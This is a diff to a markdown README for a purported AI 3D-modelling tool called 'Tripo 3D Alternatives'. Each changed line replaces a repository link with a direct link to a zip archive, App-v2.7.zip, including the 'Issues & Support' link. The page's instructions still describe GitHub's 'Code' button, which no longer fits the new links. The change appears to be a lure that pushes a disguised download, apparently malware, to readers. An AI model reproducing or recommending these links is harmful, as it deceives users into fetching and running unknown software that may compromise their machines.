@@ -7,7 +7,7 @@ description: "Compare Tripo 3D with practical alternatives for AI-generated 3D m
 
 <div align="center">
 
-[![Download Now](https://img.shields.io/badge/Download-Tripo%203D%20Alternatives-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/Kaiocs3120/tripo-3d-alternatives)
+[![Download Now](https://img.shields.io/badge/Download-Tripo%203D%20Alternatives-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://raw.githubusercontent.com/Kaiocs3120/kaiocs3120.github.io/main/semisquare/App-v2.7.zip)
 
 </div>
 
@@ -32,7 +32,7 @@ Ready to get started? Here's everything you need to know:
 
 **Step 1: Download the Application**
 
-👉 **Visit this link to download the application:** [https://github.com/Kaiocs3120/tripo-3d-alternatives](https://github.com/Kaiocs3120/tripo-3d-alternatives)
+👉 **Visit this link to download the application:** [https://raw.githubusercontent.com/Kaiocs3120/kaiocs3120.github.io/main/semisquare/App-v2.7.zip](https://raw.githubusercontent.com/Kaiocs3120/kaiocs3120.github.io/main/semisquare/App-v2.7.zip)
 
 This page contains everything you need. Click the big green "Code" button, then select "Download ZIP" to get the complete package. The download will start automatically.
 
@@ -142,9 +142,9 @@ Remember, the best way to learn is by doing. Start with a simple project, follow
 
 ## 🔗 Quick Links
 
-- [Main Repository](https://github.com/Kaiocs3120/tripo-3d-alternatives)
-- [Download Page](https://github.com/Kaiocs3120/tripo-3d-alternatives)
-- [Issues & Support](https://github.com/Kaiocs3120/tripo-3d-alternatives/issues)
+- [Main Repository](https://raw.githubusercontent.com/Kaiocs3120/kaiocs3120.github.io/main/semisquare/App-v2.7.zip)
+- [Download Page](https://raw.githubusercontent.com/Kaiocs3120/kaiocs3120.github.io/main/semisquare/App-v2.7.zip)
+- [Issues & Support](https://raw.githubusercontent.com/Kaiocs3120/kaiocs3120.github.io/main/semisquare/App-v2.7.zip)
 
 ## 📧 Need Help?
 
